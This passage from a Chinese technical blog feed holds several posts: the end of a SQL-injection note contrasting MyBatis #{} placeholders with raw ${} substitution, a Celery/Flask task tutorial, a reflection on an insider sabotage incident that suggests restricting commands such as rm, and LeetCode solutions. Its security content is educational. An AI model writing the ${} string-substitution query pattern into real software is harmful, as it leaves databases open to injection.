class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name = &quot;test&quot;;</span><br><span class="line">select * from user where name = #&#123;name&#125;;</span><br><span class="line">或</span><br><span class="line">select * from user where name = &#x27;$&#123;name&#125;&#x27;;</span><br></pre></td></tr></table></figure><p>但是在动态 SQL 解析阶段，<code>#&#123; &#125;</code>和 <code>$&#123; &#125;</code> 会有不同的表现：</p><p><strong>#{ }会解析为一个 JDBC 预编译语句（prepared statement）的参数标记符</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eg:</span><br><span class="line">select * from user where name = #&#123;name&#125;;</span><br><span class="line"># 解析为：</span><br><span class="line">select * from user where name = ?;</span><br></pre></td></tr></table></figure><p>一个 <code>#&#123; &#125;</code> 被解析为一个参数占位符 <code>?</code></p><p><strong>${ } 仅仅为一个纯碎的 string 替换，在动态 SQL 解析阶段将会进行变量替换</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where name = &#x27;$&#123;name&#125;&#x27;;</span><br><span class="line"># 当传递的参数为 &quot;test&quot; 时，上述 sql 的解析为</span><br><span class="line">select * from user where name = &quot;test&quot;;</span><br></pre></td></tr></table></figure><p>预编译之前的 SQL 语句已经不包含变量 name 了<br><code>$&#123; &#125;</code>的变量的替换阶段是在动态 SQL 解析阶段，而 <code>#&#123; &#125;</code> 的变量的替换是在 DBMS 中</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.nowcoder.net/n/9d9987c816214f62b9266276da65e11f">深入理解SQL注入与预编译</a><br><a href="https://www.anquanke.com/post/id/170626">K0rz3n师傅：一篇文章带你深入理解 SQL 盲注</a><br><a href="https://xz.aliyun.com/t/5505">SQL注入的有趣姿势</a><br><a href="https://xz.aliyun.com/t/8003">REGEXP注入与LIKE注入学习笔记</a><br><a href="https://segmentfault.com/a/1190000004617028">mybatis深入理解(一)之 # 与 $ 区别以及 sql 预编译</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#sql%E7%9B%B2%E6%B3%A8&quot;&gt;SQL盲注&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&quot;&gt;布尔盲注&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>基于Celery的后台任务</title>
    <link href="https://yinwc.github.io/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/"/>
    <id>https://yinwc.github.io/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/</id>
    <published>2021-01-12T09:35:12.000Z</published>
    <updated>2023-01-28T09:55:21.127Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#celery%E7%AE%80%E4%BB%8B">Celery简介</a><ul><li><a href="#%E5%88%9B%E5%BB%BAcelery-%E5%AE%9E%E4%BE%8B">创建Celery 实例</a></li></ul></li><li><a href="#flask%E4%B8%AD%E4%BD%BF%E7%94%A8celery">Flask中使用Celery</a></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="Celery简介"><a href="#Celery简介" class="headerlink" title="Celery简介"></a>Celery简介</h2><p>Celery 是一个异步任务队列&#x2F;基于分布式消息传递的作业队列，Celery 是一个强大的分布式任务队列，它可以让任务的执行完全脱离主程序，甚至可以被分配到其他主机上运行。通常使用它来实现异步任务（async task）和定时任务（crontab）</p><p>应用程序可能需要执行任何消耗资源的任务都可以交给任务队列，让应用程序自由和快速地响应客户端请求。</p><p>Celery是用Python编写的，但该协议可以在任何语言实现。它也可以与其他语言通过webhooks实现。</p><p><img src="/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/1.png" alt="Python-Celery"></p><p>Celery主要包括以下四个模块：</p><ul><li><p>任务模块 <strong>Task</strong><br>包含异步任务和定时任务。其中，异步任务通常在业务逻辑中被触发并发往任务队列，而定时任务由 Celery Beat 进程周期性地将任务发往任务队列。</p></li><li><p>消息中间件<strong>Broker</strong></p><ul><li>Broker，即为任务调度队列，接收任务生产者发来的消息（即任务），将任务存入队列。Celery 本身不提供队列服务，官方推荐使用 RabbitMQ 和 Redis 等。</li><li>Broker部分负责任务消息的分发以及任务结果的存储这部分任务主要由中间数据存储系统完成，比如消息队列服务器RabbitMQ、redis、Amazon SQS、MongoDB、IronMQ等或者关系型数据库，使用关系型数据库依赖sqlalchemy或者django的ORM</li></ul></li><li><p>任务执行单元<strong>Worker</strong></p><ul><li>Worker 是执行任务的处理单元，它实时监控消息队列，获取队列中调度的任务，并执行它。在我的理解中工作线程就是写的python代码，当然还包括python调用系统工具功能</li></ul></li><li><p>任务结果存储<strong>Backend</strong></p><ul><li>Backend 用于存储任务的执行结果，以供查询。同消息中间件一样，存储也可使用 RabbitMQ, Redis 和 MongoDB 等。</li></ul></li></ul><p>使用 Celery 实现异步任务主要包含三个步骤：</p><ol><li>创建一个 Celery 实例</li><li>启动 Celery Worker</li><li>应用程序调用异步任务</li></ol><h3 id="创建Celery-实例"><a href="#创建Celery-实例" class="headerlink" title="创建Celery 实例"></a>创建Celery 实例</h3><p>创建test.py文件，写入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author:V1ZkRA</span></span><br><span class="line"><span class="comment"># Time:2021/1/12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> celery <span class="keyword">import</span> Celery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定消息中间件用 redis，URL 为 redis://127.0.0.1:6379；</span></span><br><span class="line">broker = <span class="string">&#x27;redis://127.0.0.1:6379&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定存储用 redis，URL 为 redis://127.0.0.1:6379/0；</span></span><br><span class="line"></span><br><span class="line">backend = <span class="string">&#x27;redis://127.0.0.1:6379/0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个 Celery 实例 app，名称为 my_task；</span></span><br><span class="line">app = Celery(<span class="string">&#x27;my_task&#x27;</span>, broker=broker, backend=backend)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建了一个 Celery 任务 add，当函数被 @app.task 装饰后，就成为可被 Celery 调度的任务；</span></span><br><span class="line"><span class="meta">@app.task</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y</span>):</span><br><span class="line">    time.sleep(<span class="number">5</span>)     <span class="comment"># 模拟耗时操作</span></span><br><span class="line">    <span class="keyword">return</span> x + y</span><br></pre></td></tr></table></figure><p>启动Celery Worker<br>在当前目录，使用如下方式启动 Celery Worker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">celery worker -A tasks --loglevel=info</span><br></pre></td></tr></table></figure><p><img src="/2021/01/12/%E5%9F%BA%E4%BA%8ECelery%E7%9A%84%E5%90%8E%E5%8F%B0%E4%BB%BB%E5%8A%A1/2.png" alt="Python-Celery"></p><h2 id="Flask中使用Celery"><a href="#Flask中使用Celery" class="headerlink" title="Flask中使用Celery"></a>Flask中使用Celery</h2><p><a href="https://github.com/miguelgrinberg/flask-celery-example">flask-celery-example</a></p><p>示例代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.update(</span><br><span class="line">    CELERY_BROKER_URL=&#x27;redis://localhost:6379&#x27;,</span><br><span class="line">    CELERY_RESULT_BACKEND=&#x27;redis://localhost:6379&#x27;</span><br><span class="line">)</span><br><span class="line">celery = make_celery(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@celery.task()</span><br><span class="line">def add_together(a, b):</span><br><span class="line">    return a + b</span><br></pre></td></tr></table></figure><p>在后台进行调度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; result = add_together.delay(23, 42)</span><br><span class="line">&gt;&gt;&gt; result.wait()</span><br><span class="line">65</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/chenqiuge1984/article/details/80127446">异步任务神器 Celery 快速入门教程</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#celery%E7%AE%80%E4%BB%8B&quot;&gt;Celery简介&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%88%9B%E5%BB%BAcelery-%E5%AE%9E%E4%BE%8B&quot;&gt;创建Cel</summary>
      
    
    
    
    
    <category term="python" scheme="https://yinwc.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>安全事件以及后续整改的反思</title>
    <link href="https://yinwc.github.io/2020/12/18/2020%E5%B9%B4%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E6%95%B4%E6%94%B9%E7%9A%84%E5%8F%8D%E6%80%9D/"/>
    <id>https://yinwc.github.io/2020/12/18/2020%E5%B9%B4%E5%AE%89%E5%85%A8%E4%BA%8B%E4%BB%B6%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BB%AD%E6%95%B4%E6%94%B9%E7%9A%84%E5%8F%8D%E6%80%9D/</id>
    <published>2020-12-18T08:59:02.000Z</published>
    <updated>2023-01-28T09:26:50.959Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>by lei.tang</p></blockquote><h2 id="本次故障及事件简要回顾（来自公开渠道推文）"><a href="#本次故障及事件简要回顾（来自公开渠道推文）" class="headerlink" title="本次故障及事件简要回顾（来自公开渠道推文）"></a>本次故障及事件简要回顾（来自公开渠道推文）</h2><ul><li>2020年2月23日，18:56分，微盟研发中心运维部核心运维人员通过VPN登入服务器，并对线上生产环境进行了恶意破坏；</li><li>2月23日 19 时，微盟内部系统监控报警，出现大面积服务集群无法响应；</li><li>2月25日7 时，生产环境和数据部分恢复，预计25日晚24点完成生产环境修复，新用户恢复业务。老用户预计到2月28日晚上才能恢复。</li><li>微盟事后对恶意破坏生产环境的嫌疑人进行追踪分析，成功定位到嫌疑人登录账号及IP地址，并于24日向宝山公安局报案。目前犯罪嫌疑人已被宝山区公安局刑事拘留，犯罪承认了犯罪事实。</li></ul><h2 id="外界的观点描述"><a href="#外界的观点描述" class="headerlink" title="外界的观点描述"></a>外界的观点描述</h2><p>1、需要说明怎样的权限来约束运维？或者往外拓宽至每一个核心研发人员，如：测试，研发，DBA 这些角色中拥有高权限的人员。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-  例如：rm、mv、alias等危险命令应该受到严格的制约； </span><br></pre></td></tr></table></figure><ul><li>一个良好的运维输出能力应该是：人管代码，代码管机器，而非人管机器。</li><li>当约束过多，照成的流程审批过多，如何不增加额外的人力物力和财力</li></ul><p>2、备份该如何做？</p><ul><li>例如：备份事件的问题，全量备份和增量备份的校验，主从备份、异地备份等的制度</li><li>恢复的验证，要常演练，因为会遇到各种问题导致的恢复失败，比如：介质问题、数据问题、操作问题等</li></ul><h2 id="反思和总结"><a href="#反思和总结" class="headerlink" title="反思和总结"></a>反思和总结</h2><p>遇到问题，只有面对问题，解决问题，才是根本，而非甩锅。</p><p>在事出第一刻，通过排除，确定问题，也验证了安全工作的一些不足，对部分权限还未考虑到位。 后续的蛇鬼牛神全员出动，各种目的的人员，只能说感谢他们的关心。</p><p>安全圈，依靠着事件来驱动企业成长的太多，每次的事件，都是给行业带来一定的波动，也锤炼着领导，更锤炼着躺枪的负责人员，后续也就无非惩罚多少来以儆效尤了。</p><ul><li>简单罗列几点思考：<ul><li>1、工程师或者内部员工的职业道德，如加强安全意识以及法律法规教育；<ul><li>如何避免：内部员工账号密码泄露、内部代码泄露（如上传github、码云等三方平台）、或者邮件钓鱼攻击等各种情况 安全意识培训不能少，并且要定期执行，对研发，测试，运维，产品等，乃至于拓展到全员，以及新员工入职的培训。 更高的要求：对于管理者来说，或许员工的心里建设也是一个可指引的方向吧。毕竟人是企业的核心资产。</li></ul></li><li>2、服务器厂商的选择以及监控报警完善<ul><li>是自建IDC，还是混合云，还是全部上云，所带来的技术支持是截然不同的，涉及的服务恢复以及数据恢复。 监控报警体系的完善，对于敏感操作的监控以及报警及时性。当然根据本次事件，监控报警也就只能起到查原因的作用了，但依然不能否认他存在的价值。要不然为啥要ELK。</li></ul></li><li>3、梳理全网的站点，把控隔离情况<ul><li>及时梳理所有的网站，通过内部上报，运维外网开放host解析，IP探测，等多种方式，梳理内网外开放情况，</li><li>严格把控QA、DEV、PL、Oline 环境的相互隔离，以及非必要外网开放项目的回归内网</li></ul></li><li>4、权限以及角色的梳理<ul><li>对于运维、DBA、安全实现三权分立，运维管执行，DBA管数据，安全管审计，对于执行&#x2F;使用备份和存储备份的人员进行分开</li><li>对于角色这一块，进行最小权限执行的规定，以及同时启动角色系统平台开发，解决多平台的角色设置冗余</li><li>对于权限的申请，要执行多方审核，解决很多误操作，比如删数据，删文件等有意无意的操作</li></ul></li><li>5、全盘恢复后的安全复检<ul><li>近期三方提交了一些安全漏洞上来，发现很多漏洞都是之前没出现的功能，或者说之前已修复的，哪也就说明，恢复后的代码，出现了部分代码的回滚现象，或者说是业务迭代的时候，并没有同步安全部门。</li><li>哪如何去解决这样的问题呢？<ul><li>需要多个人互相校验平台，每个人都有各自的漏洞挖掘思路； 把安全加到更多环节中，如新业务上线、重点项目发版、核心项目每月安测等，把SDLC闭环； 专项的成立以及推进，可拉动多岗位人员参与，如敏感数据加密专项，账号体系专项等等</li></ul></li></ul></li><li>6、其他安全平台想法<ul><li>漏洞平台的总结，搭建漏洞管理平台，以及后续对接其他平台的二次开发 靶场平台的搭建，配合着安全培训，提高企业内部技术团队的演练效果</li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;by lei.tang&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;本次故障及事件简要回顾（来自公开渠道推文）&quot;&gt;&lt;a href=&quot;#本次故障及事件简要回顾（来自公开渠道推文）&quot; class=&quot;headerlink&quot; title=&quot;本次故障</summary>
      
    
    
    
    
    <category term="企业安全" scheme="https://yinwc.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode的一些记录</title>
    <link href="https://yinwc.github.io/2020/11/28/LeetCode%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/"/>
    <id>https://yinwc.github.io/2020/11/28/LeetCode%E7%9A%84%E4%B8%80%E4%BA%9B%E8%AE%B0%E5%BD%95/</id>
    <published>2020-11-28T08:56:40.000Z</published>
    <updated>2023-02-02T07:03:59.414Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E4%B8%80%E7%BB%84%E6%95%B0%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C">一组数数组的动态和</a></li><li><a href="#%E5%AF%BB%E6%89%BE%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E5%BF%83%E7%B4%A2%E5%BC%95">寻找数组的中心索引</a></li><li><a href="#%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C">两数之和</a></li><li><a href="#%E6%95%B4%E6%95%B0%E5%8F%8D%E8%BD%AC">整数反转</a></li><li><a href="#%E5%9B%9E%E6%96%87%E6%95%B0">回文数</a></li><li><a href="#%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0">罗马数字转整数</a></li><li><a href="#%E6%9C%80%E9%95%BF%E5%85%AC%E5%85%B1%E5%89%8D%E7%BC%80">最长公共前缀</a></li></ul><!-- /TOC --><h3 id="一组数数组的动态和"><a href="#一组数数组的动态和" class="headerlink" title="一组数数组的动态和"></a>一组数数组的动态和</h3><p>给你一个数组 nums 。数组「动态和」的计算公式为：runningSum[i] &#x3D; sum(nums[0]…nums[i]) 。<br>请返回 nums 的动态和。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：nums = [1,2,3,4]</span><br><span class="line">输出：[1,3,6,10]</span><br><span class="line">解释：动态和计算过程为 [1, 1+2, 1+2+3, 1+2+3+4] 。</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：nums = [1,1,1,1,1]</span><br><span class="line">输出：[1,2,3,4,5]</span><br><span class="line">解释：动态和计算过程为 [1, 1+1, 1+1+1, 1+1+1+1, 1+1+1+1+1] 。</span><br><span class="line">示例 3：</span><br><span class="line"></span><br><span class="line">输入：nums = [3,1,2,10,1]</span><br><span class="line">输出：[3,4,6,16,17]</span><br><span class="line">class Solution:</span><br><span class="line">    def runningSum(self, nums: List[int]) -&gt; List[int]:</span><br><span class="line">        if not nums:</span><br><span class="line">            return []</span><br><span class="line">        for i in range(1,len(nums)):</span><br><span class="line">            nums[i]=nums[i]+nums[i-1]</span><br><span class="line">        return nums</span><br></pre></td></tr></table></figure><h3 id="寻找数组的中心索引"><a href="#寻找数组的中心索引" class="headerlink" title="寻找数组的中心索引"></a>寻找数组的中心索引</h3><ul><li><a href="https://leetcode-cn.com/problems/find-pivot-index/">寻找数组的中心索引</a></li></ul><p>解题思路：先求出所有数的总和，然后遍历数组，如果遍历数的左边*2 + 遍历数 &#x3D;&#x3D; 总和 ， 那这个数就一定是中心索引。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def pivotIndex(self, nums: List[int]) -&gt; int:</span><br><span class="line">        S=sum(nums)</span><br><span class="line">        leftnums=0</span><br><span class="line">        for i in range(len(nums)):</span><br><span class="line">            if leftnums *2  +  nums[i] == S:</span><br><span class="line">                return i</span><br><span class="line">            else:</span><br><span class="line">                leftnums += nums[i]</span><br><span class="line">        else:</span><br><span class="line">            return -1</span><br></pre></td></tr></table></figure><p><code>sum()</code> 方法对序列进行求和计算</p><p>Reference: <a href="https://www.pythonheidong.com/blog/article/249069/53202e9ddbc9740732b4/">https://www.pythonheidong.com/blog/article/249069/53202e9ddbc9740732b4/</a></p><h3 id="两数之和"><a href="#两数之和" class="headerlink" title="两数之和"></a>两数之和</h3><ul><li><a href="https://leetcode-cn.com/problems/two-sum/">两数之和</a></li></ul><p>方法一：使用最容易理解的遍历数组进行查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def solution(nums,target):</span><br><span class="line">#如果列表长度小于2，则直接结束</span><br><span class="line">if len(nums) &lt; 2:</span><br><span class="line">            return</span><br><span class="line">        #两次循环列表，分别对列表中的所有可能的数字进行相加</span><br><span class="line">        #循环两次列表对应的时间复杂度为O(n²)</span><br><span class="line">        for i in range(0, len(nums) - 1):</span><br><span class="line">            for j in range(i+1, len(nums)):</span><br><span class="line">                if nums[i] + nums[j] == target:</span><br><span class="line">                    return [i, j]</span><br></pre></td></tr></table></figure><p>方法二：使用哈希表，通过以空间换取速度的方式，可以将查找时间从 O(n)降低到 O(1)。在python中列表字典的即为哈希类型。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def solution(nums,target):</span><br><span class="line">#新建立一个空字典用来保存数值及其在列表中对应的索引</span><br><span class="line">dict1 = &#123;&#125;</span><br><span class="line">#遍历一遍列表对应的时间复杂度为O(n)</span><br><span class="line">        for i in range(0, len(nums)):</span><br><span class="line">            #相减得到另一个数值</span><br><span class="line">            num = target - nums[i]</span><br><span class="line">            #如果另一个数值不在字典中，则将第一个数值及其的索引报错在字典中</span><br><span class="line">            #因为在字典中查找的时间复杂度为O(1)，因此总时间复杂度为O(n)</span><br><span class="line">            if num not in dict1:</span><br><span class="line">                dict1[nums[i]] = i</span><br><span class="line">            #如果在字典中则返回</span><br><span class="line">            else:</span><br><span class="line">                return [dict1[num], i]</span><br></pre></td></tr></table></figure><h3 id="整数反转"><a href="#整数反转" class="headerlink" title="整数反转"></a>整数反转</h3><ul><li><a href="https://leetcode-cn.com/problems/reverse-integer/">整数反转</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def reverse(self, x: int) -&gt; int:</span><br><span class="line">        if x == 0:</span><br><span class="line">            return 0</span><br><span class="line">        if x &gt; 0:</span><br><span class="line">            x = str(x)</span><br><span class="line">            x = x[::-1]</span><br><span class="line">        else:</span><br><span class="line">            x = str(x)</span><br><span class="line">            x = x[1:]    #为了删除负号</span><br><span class="line">            x = x[::-1]</span><br><span class="line">            x = &#x27;-&#x27; + x</span><br><span class="line">        x = int(x)</span><br><span class="line">        if -2**31 &lt; x &lt; 2**31-1:    #为了不超出32位整数</span><br><span class="line">            return x</span><br><span class="line">        else:</span><br><span class="line">            return 0</span><br></pre></td></tr></table></figure><p>利用R &#x3D; X[::-1]这种方法对X（X必须是字符串）进行一个反转复制的操作<br>[python 中的<a href="https://www.cnblogs.com/mxh1099/p/5804064.html">::-1]</a><br><a href="https://www.cnblogs.com/malinqing/p/11272485.html">彻底搞懂切片操作</a></p><h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><ul><li><a href="https://leetcode-cn.com/problems/palindrome-number/">回文数</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def isPalindrome(self, x: int) -&gt; bool:</span><br><span class="line">            if x&lt;0:</span><br><span class="line">                return False</span><br><span class="line">            x=str(x)</span><br><span class="line">            y=x[::-1]</span><br><span class="line">            if x==y:</span><br><span class="line">                return True</span><br><span class="line">            else:</span><br><span class="line">                return False</span><br></pre></td></tr></table></figure><h3 id="罗马数字转整数"><a href="#罗马数字转整数" class="headerlink" title="罗马数字转整数"></a>罗马数字转整数</h3><ul><li><a href="https://leetcode-cn.com/problems/roman-to-integer/">罗马数字转整数</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def romanToInt(self, s: str) -&gt; int:</span><br><span class="line">        d = &#123;&#x27;I&#x27;: 1, &#x27;IV&#x27;: 4, &#x27;V&#x27;: 5, &#x27;IX&#x27;: 9, &#x27;X&#x27;: 10, &#x27;XL&#x27;: 40, &#x27;L&#x27;: 50, &#x27;XC&#x27;: 90,  &#x27;C&#x27;: 100, &#x27;CD&#x27;: 400, &#x27;D&#x27;: 500, &#x27;CM&#x27;: 900, &#x27;M&#x27;: 1000&#125;</span><br><span class="line">        result = 0</span><br><span class="line">        i = 0</span><br><span class="line">        while i &lt; len(s):</span><br><span class="line">            #查看当前位和下一位的字符</span><br><span class="line">            str1 = s[i:i+2]</span><br><span class="line">            #如果当前位置是特殊情况，那么返回其在字典中对应值，并且下一次从特殊字符之后一位开始索引</span><br><span class="line">            if str1 in d:</span><br><span class="line">                result += d.get(str1)</span><br><span class="line">                i += 2</span><br><span class="line">            #如果当前位不是特殊情况，那么只返回当前位的数值</span><br><span class="line">            else:</span><br><span class="line">                result += d[s[i]]</span><br><span class="line">                i += 1</span><br><span class="line">        return result</span><br></pre></td></tr></table></figure><h3 id="最长公共前缀"><a href="#最长公共前缀" class="headerlink" title="最长公共前缀"></a>最长公共前缀</h3><ul><li><a href="https://leetcode-cn.com/problems/longest-common-prefix/">最长公共前缀</a></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Solution:</span><br><span class="line">    def longestCommonPrefix(self, strs):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        :type strs: List[str]</span><br><span class="line">        :rtype: str</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        if not strs:                                        #边界条件判断，若字符串为空，则返回空</span><br><span class="line">            return &quot;&quot;</span><br><span class="line">        short_word=min(strs,key=len)                        #筛选出长度最短的单词然后进行遍历</span><br><span class="line">        for i,e in enumerate(short_word):                   #遍历长度最短的单词</span><br><span class="line">            for others in strs:                             #遍历列表中的其他字符串</span><br><span class="line">                if others[i]!=e:                            #一旦出现非公共字符，返回公共字符</span><br><span class="line">                    return short_word[:i]</span><br><span class="line">        return short_word                                   #遍历结束后依然没匹配到非公共字符，则返回整个字符</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/python-func-enumerate.html">enumerate</a><br><code>enumerate()</code> 函数用于将一个可遍历的数据对象(如列表、元组或字符串)组合为一个索引序列，同时列出数据和数据下标，一般用在 for 循环当中。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E4%B8%80%E7%BB%84%E6%95%B0%E6%95%B0%E7%BB%84%E7%9A%84%E5%8A%A8%E6%80%81%E5%92%8C&quot;&gt;一组数数组的动态和&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    
    <category term="learn" scheme="https://yinwc.github.io/tags/learn/"/>
    
  </entry>
  
  <entry>
    <title>深入理解CORS漏洞</title>
